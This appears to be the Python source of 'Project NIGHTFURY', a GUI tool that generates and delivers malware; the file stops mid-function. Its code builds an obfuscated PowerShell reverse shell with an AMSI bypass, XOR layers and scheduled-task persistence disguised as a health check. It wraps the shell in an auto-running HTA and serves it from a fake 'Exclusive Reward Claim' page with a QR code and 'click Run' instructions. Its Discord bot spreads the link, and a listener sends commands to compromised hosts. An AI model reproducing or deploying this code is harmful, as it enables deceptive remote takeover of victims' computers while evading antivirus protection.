#!/usr/bin/env python3
"""
Project NIGHTFURY - Advanced Auto-Execute Payload System
Author: Cyber Sentinel
Version: 4.0
Description: Payload framework with reliable auto-execution via links and Discord
"""

import os
import sys
import base64
import random
import string
import socket
import threading
import time
import requests
import json
import discord
from discord.ext import commands
import asyncio
import subprocess
import uuid
import re
import logging
import qrcode
import io
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QSplitter, QFormLayout, QSizePolicy, QStatusBar, QStackedWidget
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QPalette, QColor, QIcon, QPixmap, QImage

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

# ==============================
# CORE PAYLOAD GENERATION ENGINE
# ==============================

class NightfuryPayload:
    def __init__(self, lhost, lport, obfuscation_level=4, persistence=True):
        self.lhost = lhost
        self.lport = lport
        self.obfuscation_level = obfuscation_level
        self.persistence = persistence
        self.payload = None
        self.payload_id = str(uuid.uuid4())[:8]
    
    def _generate_key(self, length=32):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def _xor_encrypt(self, payload):
        key = self._generate_key()
        encrypted = bytearray()
        for i in range(len(payload)):
            encrypted.append(payload[i] ^ ord(key[i % len(key)]))
        return base64.b64encode(encrypted).decode(), key
    
    def _add_amsi_bypass(self, payload):
        bypass_code = '''
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null, @{});
        '''
        return bypass_code + payload
    
    def _add_persistence(self, payload):
        persistence_code = f'''
        $taskName = "SystemHealthCheck_{self.payload_id}";
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{payload}`"";
        $trigger = New-ScheduledTaskTrigger -AtLogOn;
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive;
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew;
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null;
        '''
        return persistence_code
    
    def _obfuscate_vars(self, payload):
        # Replace common variable names with random strings
        var_map = {
            'c': self._generate_key(6),
            's': self._generate_key(6),
            'b': self._generate_key(6),
            'i': self._generate_key(6),
            'd': self._generate_key(6),
            'sb': self._generate_key(6),
            'sb2': self._generate_key(6),
            'bt': self._generate_key(6)
        }
        
        for orig, new in var_map.items():
            payload = payload.replace(f'${orig}', f'${new}')
        
        return payload
    
    def _insert_junk_code(self, payload):
        # Insert random comments and junk operations
        junk_ops = [
            "Start-Sleep -Milliseconds 10;",
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;",
            "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');",
            "$junkVar = [System.Guid]::NewGuid().ToString();"
        ]
        
        lines = payload.split(';')
        new_lines = []
        for line in lines:
            if line.strip() and random.random() > 0.7:
                junk = random.choice(junk_ops)
                new_lines.append(junk)
            new_lines.append(line)
        
        return ';'.join(new_lines)
    
    def generate(self):
        # Base PowerShell reverse shell with enhanced obfuscation
        ps_code = f'''
        $c = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
        $s = $c.GetStream();
        [byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
            $sb = (iex $d 2>&1 | Out-String );
            $sb2 = $sb + "PS " + (pwd).Path + "> ";
            $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
            $s.Write($sbt,0,$sbt.Length);
            $s.Flush()
        }}
        $c.Close()
        '''
        
        # Add AMSI bypass
        ps_code = self._add_amsi_bypass(ps_code)
        
        # Apply obfuscation layers
        for _ in range(self.obfuscation_level):
            encrypted, key = self._xor_encrypt(ps_code.encode())
            ps_code = f'''
            $k = "{key}";
            $s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{encrypted}"));
            $r = '';
            0..($s.Length-1)|%{{$r += [char]($s[$_] -bxor $k[$_ % $k.Length])}};
            iex $r
            '''
            # Randomize variable names
            ps_code = self._obfuscate_vars(ps_code)
            # Insert junk code
            ps_code = self._insert_junk_code(ps_code)
        
        # Add persistence if requested
        if self.persistence:
            ps_code = self._add_persistence(ps_code)
        
        # Final payload formatting
        self.payload = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"{ps_code}\""
        return self.payload
    
    def generate_hta(self):
        if not self.payload:
            self.generate()
        
        # Create HTA file that auto-executes the payload
        hta_content = f"""
        <html>
        <head>
        <title>Reward Claim Center</title>
        <HTA:APPLICATION ID="RewardClaim" APPLICATIONNAME="Reward Claim" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
        <script language="VBScript">
            Sub Window_OnLoad
                On Error Resume Next
                Set objShell = CreateObject("Wscript.Shell")
                objShell.Run "{self.payload.replace('"', '""')}", 0, False
                Self.Close
            End Sub
        </script>
        </head>
        <body>
        <div style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>Processing Your Reward...</h1>
            <p>Please wait while we verify and apply your bonus.</p>
        </div>
        </body>
        </html>
        """
        return hta_content

# ========================
# AUTO-EXECUTION ENGINES
# ========================

class AutoExecutionServer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Check for trigger parameter
        if parsed_path.path == "/claim":
            # Send auto-execute HTA file
            self.send_response(200)
            self.send_header('Content-Type', 'application/hta')
            self.send_header('Content-Disposition', 'attachment; filename="reward_claim.hta"')
            self.end_headers()
            
            # Generate HTA payload
            payload = NightfuryPayload(
                self.server.lhost, 
                self.server.lport,
                self.server.obfuscation_level,
                self.server.persistence
            )
            hta_content = payload.generate_hta()
            self.wfile.write(hta_content.encode())
            logger.info(f"Served payload to {self.client_address[0]}")
            return
        
        # Serve a decoy page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Generate a random claim token
        claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        claim_url = f"http://{self.server.domain}/claim?token={claim_token}"
        
        # Create QR code
        qr = qrcode.QRCode()
        qr.add_data(claim_url)
        qr_img = qr.make_image(fill_color="black", back_color="white")
        img_byte_arr = io.BytesIO()
        qr_img.save(img_byte_arr, format='PNG')
        img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode()
        
        # Serve decoy page with QR code
        html_content = f"""
        <html>
        <head>
            <title>Exclusive Reward Claim</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c); 
                        color: white; text-align: center; padding: 20px; }}
                .container {{ max-width: 800px; margin: 0 auto; background: rgba(0, 0, 0, 0.7); 
                            padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }}
                h1 {{ color: #ffcc00; }}
                .qr-container {{ margin: 20px auto; padding: 15px; background: white; 
                                border-radius: 10px; display: inline-block; }}
                .button {{ background: #ffcc00; color: #1a2a6c; padding: 15px 30px; 
                         font-size: 18px; border: none; border-radius: 50px; 
                         cursor: pointer; font-weight: bold; margin: 20px; 
                         box-shadow: 0 4px 8px rgba(0,0,0,0.3); }}
                .button:hover {{ background: #ffdd33; }}
                .instructions {{ background: rgba(255, 255, 255, 0.1); padding: 15px; 
                              border-radius: 10px; margin: 20px 0; text-align: left; }}
            </style>
            <script>
                function startClaim() {{
                    // Create iframe to trigger download without leaving page
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = '/claim?token={claim_token}';
                    document.body.appendChild(iframe);
                    
                    // Show processing message
                    document.getElementById('processing').style.display = 'block';
                    document.getElementById('claim-button').style.display = 'none';
                    
                    // Show manual download link after delay
                    setTimeout(function() {{
                        document.getElementById('manual-download').style.display = 'block';
                    }}, 5000);
                }}
            </script>
        </head>
        <body>
            <div class="container">
                <h1>🎁 Exclusive Reward Claim Center 🎁</h1>
                <p>Congratulations! You've been selected to receive a special bonus.</p>
                
                <div class="qr-container">
                    <img src="data:image/png;base64,{img_base64}" alt="Claim QR Code" width="200">
                </div>
                
                <p>Scan the QR code with your mobile device or click the button below to claim your reward:</p>
                
                <button id="claim-button" class="button" onclick="startClaim()">CLAIM YOUR REWARD NOW</button>
                
                <div id="processing" style="display: none;">
                    <h2>Processing Your Claim...</h2>
                    <p>Your reward is being prepared. This may take a few moments.</p>
                    <div style="margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; 
                                border-top: 5px solid #ffcc00; border-radius: 50%; animation: spin 2s linear infinite;"></div>
                    <style>@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style>
                </div>
                
                <div id="manual-download" style="display: none; margin-top: 30px;">
                    <div class="instructions">
                        <h3>Manual Claim Instructions</h3>
                        <p>If your reward didn't start automatically:</p>
                        <ol>
                            <li>Click the download link below</li>
                            <li>Open the downloaded file</li>
                            <li>Click "Run" if prompted by Windows security</li>
                        </ol>
                        <p><a href="/claim?token={claim_token}" style="color: #ffcc00; font-weight: bold;">Download Reward Claim Assistant</a></p>
                    </div>
                </div>
                
                <div style="margin-top: 30px; font-size: 14px; opacity: 0.8;">
                    <p>This is a secure system provided by your organization.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.wfile.write(html_content.encode())
        logger.info(f"Served decoy page to {self.client_address[0]}")

# =====================
# GUI APPLICATION
# =====================

class NightfuryGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Project NIGHTFURY v4.0")
        self.setGeometry(100, 100, 1200, 800)
        
        # Initialize configuration
        self.config = {
            'lhost': self.get_public_ip(),
            'lport': 4444,
            'obfuscation_level': 4,
            'persistence': True,
            'discord_token': "",
            'auto_server_port': 8080,
            'domain': "reward-center.org"  # Obfuscation domain
        }
        self.current_payload = None
        self.listener_thread = None
        self.http_server = None
        self.discord_bot = None
        self.active_connections = []
        
        # Create main tabs
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)
        
        # Create tabs
        self.create_config_tab()
        self.create_payload_tab()
        self.create_listener_tab()
        self.create_auto_execute_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ System Ready")
        
        # Apply dark theme
        self.apply_dark_theme()
        
        # Show banner
        self.show_banner()
        
        # Setup connection monitor
        self.connection_monitor = QTimer()
        self.connection_monitor.timeout.connect(self.update_connection_status)
        self.connection_monitor.start(1000)  # Check every second
    
    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "127.0.0.1"
    
    def apply_dark_theme(self):
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.WindowText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Base, QColor(30, 32, 38))
        dark_palette.setColor(QPalette.AlternateBase, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.ToolTipBase, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ToolTipText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Text, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Button, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Highlight, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        
        # Set style
        self.setStyleSheet("""
            QGroupBox {
                border: 1px solid #4a4a4a;
                border-radius: 8px;
                margin-top: 1ex;
                font-weight: bold;
                color: #61aeee;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #61aeee;
            }
            QTextEdit, QListWidget, QLineEdit {
                background-color: #282c34;
                color: #abb2bf;
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                padding: 8px;
                font-family: 'Consolas';
            }
            QPushButton {
                background-color: #3d8eff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                min-height: 30px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #5a9cff;
            }
            QPushButton:disabled {
                background-color: #555;
            }
            QTabWidget::pane {
                border: 1px solid #4a4a4a;
                background: #282c34;
            }
            QTabBar::tab {
                background: #282c34;
                color: #abb2bf;
                padding: 10px;
                border: 1px solid #4a4a4a;
                border-bottom: none;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background: #3d8eff;
                color: white;
                border-color: #4a4a4a;
            }
            QProgressBar {
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                text-align: center;
                background: #282c34;
                height: 20px;
            }
            QProgressBar::chunk {
                background-color: #3d8eff;
                width: 10px;
            }
            QStatusBar {
                background: #21252b;
                color: #abb2bf;
                padding: 4px;
            }
        """)
    
    def show_banner(self):
        banner = """
  ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
  ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
  ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
  ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
  ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
  ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
  """
        print(banner)
    
    def create_config_tab(self):
        config_tab = QWidget()
        layout = QVBoxLayout()
        config_tab.setLayout(layout)
        self.tabs.addTab(config_tab, "Configuration")
        
        # Network settings group
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.lhost_input = QLineEdit(self.config['lhost'])
        self.lhost_input.setPlaceholderText("Listener IP")
        network_layout.addRow("LHOST (Listener IP):", self.lhost_input)
        
        self.lport_input = QLineEdit(str(self.config['lport']))
        self.lport_input.setPlaceholderText("Listener Port")
        network_layout.addRow("LPORT (Listener Port):", self.lport_input)
        
        self.server_port_input = QLineEdit(str(self.config['auto_server_port']))
        self.server_port_input.setPlaceholderText("Auto-Execute Server Port")
        network_layout.addRow("Server Port:", self.server_port_input)
        
        self.domain_input = QLineEdit(self.config['domain'])
        self.domain_input.setPlaceholderText("Obfuscation Domain")
        network_layout.addRow("Obfuscation Domain:", self.domain_input)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Payload settings group
        payload_group = QGroupBox("Payload Settings")
        payload_layout = QFormLayout()
        
        self.obf_level = QComboBox()
        self.obf_level.addItems(["1 (Low)", "2", "3", "4 (Recommended)", "5 (Maximum)"])
        self.obf_level.setCurrentIndex(3)
        payload_layout.addRow("Obfuscation Level:", self.obf_level)
        
        self.persistence_cb = QCheckBox("Enable persistence (survives reboot)")
        self.persistence_cb.setChecked(True)
        payload_layout.addRow(self.persistence_cb)
        
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # API settings group
        api_group = QGroupBox("Discord Integration")
        api_layout = QFormLayout()
        
        self.discord_token_input = QLineEdit()
        self.discord_token_input.setPlaceholderText("Discord Bot Token")
        self.discord_token_input.setEchoMode(QLineEdit.PasswordEchoOnEdit)
        api_layout.addRow("Discord Token:", self.discord_token_input)
        
        api_group.setLayout(api_layout)
        layout.addWidget(api_group)
        
        # Save button
        save_btn = QPushButton("Save Configuration")
        save_btn.clicked.connect(self.save_config)
        save_btn.setFixedHeight(40)
        layout.addWidget(save_btn)
    
    def create_payload_tab(self):
        payload_tab = QWidget()
        layout = QVBoxLayout()
        payload_tab.setLayout(layout)
        self.tabs.addTab(payload_tab, "Payload")
        
        # Payload info
        payload_info = QLabel("Generate advanced reverse shell payloads with built-in evasion techniques")
        payload_info.setWordWrap(True)
        layout.addWidget(payload_info)
        
        # Generate button
        gen_btn = QPushButton("Generate Payload")
        gen_btn.clicked.connect(self.generate_payload)
        gen_btn.setFixedHeight(40)
        layout.addWidget(gen_btn)
        
        # Payload preview
        payload_preview_group = QGroupBox("Payload Preview")
        payload_preview_layout = QVBoxLayout()
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setPlaceholderText("Payload will appear here after generation")
        payload_preview_layout.addWidget(self.payload_preview)
        
        # Save buttons
        save_btn_layout = QHBoxLayout()
        self.save_btn = QPushButton("Save to File")
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self.save_payload)
        save_btn_layout.addWidget(self.save_btn)
        
        self.copy_btn = QPushButton("Copy to Clipboard")
        self.copy_btn.setEnabled(False)
        self.copy_btn.clicked.connect(self.copy_payload)
        save_btn_layout.addWidget(self.copy_btn)
        
        payload_preview_layout.addLayout(save_btn_layout)
        payload_preview_group.setLayout(payload_preview_layout)
        layout.addWidget(payload_preview_group)
    
    def create_listener_tab(self):
        listener_tab = QWidget()
        layout = QVBoxLayout()
        listener_tab.setLayout(layout)
        self.tabs.addTab(listener_tab, "Listener")
        
        # Listener controls
        controls_layout = QHBoxLayout()
        
        self.start_btn = QPushButton("Start Listener")
        self.start_btn.clicked.connect(self.start_listener)
        self.start_btn.setFixedHeight(40)
        controls_layout.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("Stop Listener")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_listener)
        self.stop_btn.setFixedHeight(40)
        controls_layout.addWidget(self.stop_btn)
        
        layout.addLayout(controls_layout)
        
        # Connection status
        status_group = QGroupBox("Connection Status")
        status_layout = QVBoxLayout()
        
        self.connection_status = QLabel("Listener not running")
        self.connection_status.setAlignment(Qt.AlignCenter)
        self.connection_status.setStyleSheet("font-weight: bold; font-size: 14px;")
        status_layout.addWidget(self.connection_status)
        
        self.connections_list = QListWidget()
        status_layout.addWidget(self.connections_list)
        
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        # Command execution
        command_group = QGroupBox("Command Execution")
        command_layout = QVBoxLayout()
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command to execute on connected clients")
        self.command_input.setEnabled(False)
        command_layout.addWidget(self.command_input)
        
        self.send_btn = QPushButton("Send Command")
        self.send_btn.setEnabled(False)
        self.send_btn.clicked.connect(self.send_command)
        command_layout.addWidget(self.send_btn)
        
        self.command_output = QTextEdit()
        self.command_output.setReadOnly(True)
        self.command_output.setPlaceholderText("Command output will appear here")
        command_layout.addWidget(self.command_output)
        
        command_group.setLayout(command_layout)
        layout.addWidget(command_group)
    
    def create_auto_execute_tab(self):
        auto_tab = QWidget()
        layout = QVBoxLayout()
        auto_tab.setLayout(layout)
        self.tabs.addTab(auto_tab, "Auto-Execution")
        
        # Auto-Execute Server Section
        server_group = QGroupBox("Auto-Execute Server")
        server_layout = QVBoxLayout()
        
        server_info = QLabel("This server delivers payloads that auto-execute when users click the reward claim link")
        server_info.setWordWrap(True)
        server_layout.addWidget(server_info)
        
        # Server controls
        server_controls = QHBoxLayout()
        
        self.start_server_btn = QPushButton("Start Auto-Server")
        self.start_server_btn.clicked.connect(self.start_auto_server)
        server_controls.addWidget(self.start_server_btn)
        
        self.stop_server_btn = QPushButton("Stop Auto-Server")
        self.stop_server_btn.setEnabled(False)
        self.stop_server_btn.clicked.connect(self.stop_auto_server)
        server_controls.addWidget(self.stop_server_btn)
        
        server_layout.addLayout(server_controls)
        
        # Server URL display
        self.server_url = QLineEdit()
        self.server_url.setReadOnly(True)
        self.server_url.setPlaceholderText("Server URL will appear here after starting")
        server_layout.addWidget(self.server_url)
        
        # Copy URL button
        copy_url_btn = QPushButton("Copy Claim URL")
        copy_url_btn.clicked.connect(self.copy_claim_url)
        server_layout.addWidget(copy_url_btn)
        
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        # Discord Bot Section
        discord_group = QGroupBox("Discord Command Integration")
        discord_layout = QVBoxLayout()
        
        discord_info = QLabel("The bot will respond to '!claim bonus' commands with an auto-execute link")
        discord_info.setWordWrap(True)
        discord_layout.addWidget(discord_info)
        
        # Bot controls
        bot_controls = QHBoxLayout()
        
        self.start_bot_btn = QPushButton("Start Discord Bot")
        self.start_bot_btn.clicked.connect(self.start_discord_bot)
        bot_controls.addWidget(self.start_bot_btn)
        
        self.stop_bot_btn = QPushButton("Stop Discord Bot")
        self.stop_bot_btn.setEnabled(False)
        self.stop_bot_btn.clicked.connect(self.stop_discord_bot)
        bot_controls.addWidget(self.stop_bot_btn)
        
        discord_layout.addLayout(bot_controls)
        
        # Bot status
        self.bot_status = QLabel("Bot status: Not running")
        discord_layout.addWidget(self.bot_status)
        
        discord_group.setLayout(discord_layout)
        layout.addWidget(discord_group)
        
        # Connection Monitor
        monitor_group = QGroupBox("Connection Monitor")
        monitor_layout = QVBoxLayout()
        
        self.connection_log = QTextEdit()
        self.connection_log.setReadOnly(True)
        self.connection_log.setPlaceholderText("Connection events will appear here")
        monitor_layout.addWidget(self.connection_log)
        
        monitor_group.setLayout(monitor_layout)
        layout.addWidget(monitor_group)
    
    def save_config(self):
        try:
            self.config['lhost'] = self.lhost_input.text()
            self.config['lport'] = int(self.lport_input.text())
            self.config['auto_server_port'] = int(self.server_port_input.text())
            self.config['domain'] = self.domain_input.text()
            self.config['obfuscation_level'] = self.obf_level.currentIndex() + 1
            self.config['persistence'] = self.persistence_cb.isChecked()
            self.config['discord_token'] = self.discord_token_input.text()
            
            self.status_bar.showMessage("✅ Configuration saved", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_payload(self):
        try:
            self.save_config()
            
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence']
            )
            self.current_payload = payload.generate()
            
            # Display payload
            self.payload_preview.setPlainText(self.current_payload)
            self.save_btn.setEnabled(True)
            self.copy_btn.setEnabled(True)
            
            self.status_bar.showMessage("✅ Payload generated successfully", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def save_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            filename, _ = QFileDialog.getSaveFileName(
                self, "Save Payload", "payload.bat", "Batch Files (*.bat);;All Files (*)"
            )
            
            if filename:
                with open(filename, "w") as f:
                    f.write("@echo off\n")
                    f.write("REM Windows System Health Check\n")
                    f.write(self.current_payload)
                self.status_bar.showMessage(f"✅ Payload saved to {filename}", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def copy_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            clipboard = QApplication.clipboard()
            clipboard.setText(self.current_payload)
            self.status_bar.showMessage("✅ Payload copied to clipboard", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_listener(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Please configure LHOST and LPORT first")
            
            # Create listener socket
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((self.config['lhost'], self.config['lport']))
            self.listener_socket.listen(5)
            
            # Start listener thread
            self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True)
            self.listener_thread.start()
            
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.command_input.setEnabled(True)
            self.send_btn.setEnabled(True)
            self.connection_status.setText(f"🟢 Listening on {self.config['lhost']}:{self.config['lport']}")
            self.connection_log.append(f"[+] Listener started on {self.config['lhost']}:{self.config['lport']}")
            
            self.status_bar.showMessage("✅ Listener started", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Listener error: {str(e)}", 5000)
    
    def listen_for_connections(self):
        while True:
            try:
                client_socket, addr = self.listener_socket.accept()
                ip, port = addr
                
                # Add to active connections
                self.active_connections.append({
                    'socket': client_socket,
                    'address': f"{ip}:{port}",
                    'active': True
                })
                
                # Update UI
                self.connection_log.append(f"[+] New connection from {ip}:{port}")
                self.connections_list.addItem(f"{ip}:{port}")
                
                # Start client handler
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, f"{ip}:{port}"),
                    daemon=True
                )
                client_thread.start()
            except:
                break
    
    def handle_client(self, client_socket, client_id):
        try:
            # Send initial prompt
            client_socket.send(b"PS C:\\> ")
            
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                try:
                    # Execute command
                    cmd = data.decode().strip()
                    if cmd.lower() == "exit":
                        break
                    
                    self.command_output.append(f"[{client_id}] > {cmd}")
                    
                    # Run command and capture output
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = result.stdout + result.stderr
                    output += f"\nPS {os.getcwd()}> "
                except Exception as e:
                    output = f"Error: {str(e)}\nPS {os.getcwd()}> "
                
                client_socket.send(output.encode())
                self.command_output.append(f"[{client_id}] {output}")
        except:
            pass
        
        # Remove connection
        self.connection_log.append(f"[-] Connection closed: {client_id}")
        for i, conn in enumerate(self.active_connections):
            if conn['address'] == client_id:
                self.active_connections.pop(i)
                break
        
        # Remove from UI
        items = self.connections_list.findItems(client_id, Qt.MatchExactly)
        for item in items:
            row = self.connections_list.row(item)
            self.connections_list.takeItem(row)
        
        client_socket.close()
    
    def stop_listener(self):
        try:
            # Close all client sockets
            for conn in self.active_connections:
                try:
                    conn['socket'].close()
                except:
                    pass
            
            # Close listener socket
            self.listener_socket.close()
            self.active_connections = []
            
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.command_input.setEnabled(False)
            self.send_btn.setEnabled(False)
            self.connection_status.setText("🔴 Listener stopped")
            self.connection_log.append("[+] Listener stopped")
            
            # Clear connections list
            self.connections_list.clear()
            
            self.status_bar.showMessage("✅ Listener stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping listener: {str(e)}", 5000)
    
    def send_command(self):
        try:
            command = self.command_input.text().strip()
            if not command:
                return
            
            # Get selected connection
            selected_items = self.connections_list.selectedItems()
            if not selected_items:
                raise Exception("Select a connection first")
            
            client_id = selected_items[0].text()
            
            # Find client socket
            for conn in self.active_connections:
                if conn['address'] == client_id:
                    conn['socket'].send(f"{command}\n".encode())
                    self.command_output.append(f"[{client_id}] > {command}")
                    self.command_input.clear()
                    return
            
            raise Exception("Connection not found")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_auto_server(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Configure LHOST and LPORT first")
            
            # Create HTTP server with custom parameters
            server_address = ('', self.config['auto_server_port'])
            
            # Create a custom handler class with our config
            class CustomHandler(AutoExecutionServer):
                pass
                
            setattr(CustomHandler, 'server', self)
            setattr(CustomHandler, 'lhost', self.config['lhost'])
            setattr(CustomHandler, 'lport', self.config['lport'])
            setattr(CustomHandler, 'obfuscation_level', self.config['obfuscation_level'])
            setattr(CustomHandler, 'persistence', self.config['persistence'])
            setattr(CustomHandler, 'domain', self.config['domain'])
            
            self.http_server = HTTPServer(server_address, CustomHandler)
            self.http_server.is_running = True
            
            # Start server in a separate thread
            server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            server_thread.start()
            
            self.start_server_btn.setEnabled(False)
            self.stop_server_btn.setEnabled(True)
            
            # Generate claim URL
            claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/"
            self.server_url.setText(claim_url)
            
            self.connection_log.append(f"[+] Auto-server started: {claim_url}")
            self.status_bar.showMessage(f"✅ Auto-server started on port {self.config['auto_server_port']}", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Server error: {str(e)}", 5000)
    
    def stop_auto_server(self):
        try:
            if self.http_server:
                self.http_server.shutdown()
                self.http_server.server_close()
                
                self.start_server_btn.setEnabled(True)
                self.stop_server_btn.setEnabled(False)
                self.server_url.clear()
                
                self.connection_log.append("[+] Auto-server stopped")
                self.status_bar.showMessage("✅ Auto-server stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping server: {str(e)}", 5000)
    
    def copy_claim_url(self):
        try:
            if self.server_url.text():
                clipboard = QApplication.clipboard()
                clipboard.setText(self.server_url.text())
                self.status_bar.showMessage("✅ Claim URL copied to clipboard", 3000)
        except Exception as e:
